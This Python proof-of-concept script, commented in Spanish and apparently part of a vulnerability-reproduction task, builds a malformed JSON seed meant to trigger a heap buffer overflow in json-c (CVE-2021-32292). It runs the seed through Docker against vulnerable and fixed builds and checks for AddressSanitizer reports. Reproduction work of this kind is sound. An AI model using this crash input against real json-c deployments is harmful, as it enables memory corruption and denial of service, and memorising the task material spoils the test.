import subprocess
import os
import sys

def generate_poc():
    print("[*] Generating PoC to trigger heap buffer overflow...")
    
    # El primer read() debe leer EXACTAMENTE 32768 bytes
    # Y debe haber un error de parsing al final de esos 32768 bytes
    # Luego puede haber más datos que serán ignorados
    
    # Primera parte: 32768 bytes con error al final
    prefix = b'{"a":"'
    
    # Ponemos un carácter inválido en la posición 32767
    # que causará error en el parsing
    # Un byte NULL (0x00) dentro de una cadena JSON es inválido
    first_chunk_padding = 32767 - len(prefix)
    invalid_char = b'\x00'  # NULL byte - definitivamente inválido en JSON string
    
    first_chunk = prefix + (b'A' * first_chunk_padding) + invalid_char
    
    # Segunda parte: más datos para que read() no retorne 0 en la primera lectura
    # (aunque estos datos no serán procesados porque el parser ya falló)
    second_chunk = b'BBBBBBBB'
    
    payload = first_chunk + second_chunk
    
    print(f"    Total size: {len(payload)} bytes")
    print(f"    First chunk: {len(first_chunk)} bytes")
    print(f"    Byte at position 32767: 0x{first_chunk[-1]:02x}")
    
    with open("manual_seed.json", "wb") as f:
        f.write(payload)
    
    return payload

def test_with_details(service_name):
    print(f"\n[*] Testing {service_name}...")
    cmd = [
        "docker", "compose", 
        "-f", "tasks/CVE-2021-32292_jsonc/compose.yml",
        "run", "--rm",
        "-v", f"{os.getcwd()}/manual_seed.json:/input/seed.bin",
        service_name,
        "/usr/local/bin/json_parse", "/input/seed.bin"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Check for key indicators
    has_error = "Failed at offset" in result.stderr
    has_asan = "AddressSanitizer" in result.stderr or "heap-buffer-overflow" in result.stderr
    
    print(f"    Exit code: {result.returncode}")
    
    if has_error:
        print(f"    ✓ Hit error path: 'Failed at offset' found")
        # Show the error line
        for line in result.stderr.split('\n'):
            if 'Failed at offset' in line:
                print(f"      {line}")
    else:
        print(f"    ✗ Did not hit error path")
        
    if has_asan:
        print(f"    ✓ AddressSanitizer detected issue!")
        # Show relevant ASan output
        for line in result.stderr.split('\n'):
            if any(keyword in line for keyword in ['heap-buffer-overflow', 'READ of size', 'json_parse.c']):
                print(f"      {line}")
    
    if result.stdout and not has_error:
        print(f"    STDOUT: {result.stdout[:100]}")
    
    return result.returncode, has_error, has_asan

def main():
    payload = generate_poc()
    
    print("\n=== Testing ===")
    
    code_vuln, error_vuln, asan_vuln = test_with_details("target-vuln")
    code_fixed, error_fixed, asan_fixed = test_with_details("target-fixed")
    
    print("\n=== RESULTS ===")
    
    if error_vuln and asan_vuln:
        if error_fixed and not asan_fixed:
            print("✅ SUCCESS!")
            print("   - Vulnerable: Hit error path + ASan detected overflow")
            print("   - Fixed: Hit error path but handled safely")
            sys.exit(0)
        else:
            print("⚠️  PARTIAL: Vuln shows overflow, but fixed behavior unclear")
            sys.exit(1)
    elif error_vuln and not asan_vuln:
        print("⚠️  Error path hit but ASan didn't detect overflow")
        print("   This might be because the read is within the same memory page")
        print("   Trying with explicit bounds check...")
        # The fix should still prevent the error message from forming
        if "error at end of input" in open("temp_fixed.txt").read() if os.path.exists("temp_fixed.txt") else "":
            print("✅ Fixed version uses bounds check message")
            sys.exit(0)
    else:
        print("❌ FAIL: Error path not triggered")
        print("   Trying alternative: byte at different position...")
        
        # Try with NULL byte at position 32766 instead
        for pos in [32766, 32765, 32764]:
            print(f"\n   Trying NULL byte at position {pos}...")
            prefix = b'{"a":"'
            padding = pos - len(prefix)
            chunk1 = prefix + (b'A' * padding) + b'\x00' + b'X' * (32767 - pos)
            chunk2 = b'BBBB'
            
            with open("manual_seed.json", "wb") as f:
                f.write(chunk1 + chunk2)
            
            code, has_err, has_asan = test_with_details("target-vuln")
            if has_err:
                print(f"      ✓ This position works!")
                if has_asan:
                    print(f"      ✓ ASan detected overflow!")
                    sys.exit(0)
                break

if __name__ == "__main__":
    main()